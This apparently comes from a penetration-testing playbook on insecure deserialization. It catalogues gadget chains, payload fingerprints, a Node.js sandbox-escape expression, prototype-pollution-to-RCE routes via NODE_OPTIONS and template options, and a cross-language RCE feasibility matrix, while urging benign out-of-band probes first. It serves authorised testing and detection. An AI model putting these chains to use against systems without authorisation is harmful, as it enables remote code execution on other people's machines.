No target gem required: the universal chains are assembled from RubyGems/stdlib classes shipped with Ruby, so
`Marshal.load` / `YAML.load`(Psych) of attacker data is RCE-feasible on a stock interpreter.
```
# Universal Marshal chain (Ruby ~2.x):  Gem::StubSpecification -> Gem::Source::SpecificFile ->
#   Gem::DependencyList -> Gem::Requirement   (terminates in a Kernel/system call).
# Ruby 3.3–4.0 variant:  Gem::SpecFetcher + forged Time + Gem::URI::Generic +
#   Gem::RequestSet::Lockfile + Gem::StubSpecification (+ Gem::Specification.load).
# Oj JSON chain:  URI::HTTP -> Gem::Resolver::SpecSpecification / Gem::Resolver::GitSpecification.
```
| library | deserialize entry the gadget rides | marker |
|---|---|---|
| Marshal | `_load` | `\x04\x08` header / base64 `BAg` |
| Psych (YAML) | `init_with` / `hash` | `--- !ruby/object:` |
| Oj (JSON, mode:object) | `hash` | `{"^o":"Class"...}` / `^t` |
| Ox (XML) | `hash` | `<o c="Class">` |
| JSON (custom) | `json_create` | `{"json_class":"Class"}` |
```
# Fingerprints beyond the header: a blob naming Gem:: classes; HTTPS egress during load;
#   artifacts under /tmp/quick/Marshal.4.8/ . Benign proof = OOB egress on load (no gem required).
# Other Ruby sinks: obj.send(user_input); the `_json` param -> Oj object mode; Bootsnap cache poisoning.
# Audit (no fire): CodeQL ruby unsafe-deserialization queries.
```

---
## Extended arsenal — Node.js revival sinks + prototype-pollution -> RCE crossover

(node-serialize `_$$ND_FUNC$$_` IIFE is above — benign DNS form only.)
```
# funcster:   {"__js_function":"function(){...}"}  -> revived in a fresh module scope;
#   escape it with  this.constructor.constructor('return process')()  to regain global/require.
# serialize-javascript:  SERIALIZE-only, but code that revives it with eval() turns it into a sink.
# cryo / serialize-to-js:  same function-revival class -> benign DNS IIFE proof, child_process = gated.
# Implicit triggers (a revived object runs these with no explicit call):
#   toString   valueOf   toJSON   then  (a "thenable" that gets awaited -> its then() fires).
```
Prototype-pollution crossover (cross-ref `prototype-pollution` + `ssti`): a merge/clone sink that writes
`__proto__` can reach RCE by polluting options a later API reads — catalogue the gadget, prove pollution on a
FRESH object first, then a benign DNS, before any exec:
```
# child_process: pollute  shell / env (NODE_OPTIONS=--require=/path) / argv0  read by spawn/exec defaults.
# templating:    pollute lodash.template / EJS / Pug / Handlebars compile options -> injected source -> RCE.
# Proof ladder:  ({}).polluted === <set>   ->   DNS OOB   ->   (gated) command.
```

---
## Extended arsenal — deserialization detection-first feasibility matrix

Extends the all-classes cheatsheet above with a per-FORMAT feasibility rating. Always: fingerprint ->
benign OOB probe (DNS/SSRF/TCP, no exec) -> only THEN catalogue the gadget family + honest feasibility.
Feasibility legend: **Self** = gadget self-contained in runtime/stdlib (RCE-feasible out of the box);
**Lib** = needs a specific dependency on the classpath; **Cfg** = needs a config state (MAC off / known key /
unsafe loader). Report High only with exec evidence; else "deserialization of untrusted data (RCE-<rating>)".
| format | fingerprint | benign OOB probe (no exec) | gadget family | RCE feasibility |
|---|---|---|---|---|
| Java ser | `rO0`/`aced`/`H4sIA` | URLDNS (DNS) / JRMPClient (TCP) | CC/Spring/ROME/… | Lib (Jdk7u21 = Self on <= 7u21) |
| Java JNDI str | `${jndi:...}` | `dns://` / `ldap://` callback | remote class-load | Cfg (egress + lookup enabled) |
| .NET BinaryFormatter | `AAEAAAD/////` | type-resolver differential | TypeConfuseDelegate | Self |
| .NET ViewState | `__VIEWSTATE=` | MAC-failure vs accept diff | ViewState gadget | Cfg (MAC off / known machineKey) |
| .NET Json.NET | `"$type":` | forced type-load / URI OOB | ObjectDataProvider | Cfg (TypeNameHandling != None) |
| PHP object | `O:` / `a:` | SoapClient SSRF (HTTP) | phpggc framework chain | Lib (framework gadget present) |
| PHP phar | `phar://` + file op | SoapClient metadata SSRF | phpggc chain | Lib + file-op sink |
| Python pickle | `gASV` / `.pkl` / `.pt` | `__reduce__` socket DNS | `__reduce__` (built-in) | Self |
| Python YAML | `!!python/` tag | `apply:socket.gethostbyname` | object/new / apply | Cfg (Full/Unsafe loader) |
| Ruby Marshal | `\x04\x08` / `BAg` | egress on load | Gem:: universal chain | Self (stock interpreter) |
| Node func-revival | `_$$ND_FUNC$$_`/`__js_function` | DNS-lookup IIFE | IIFE / proto-pollution | Self / Cfg (pollution sink) |
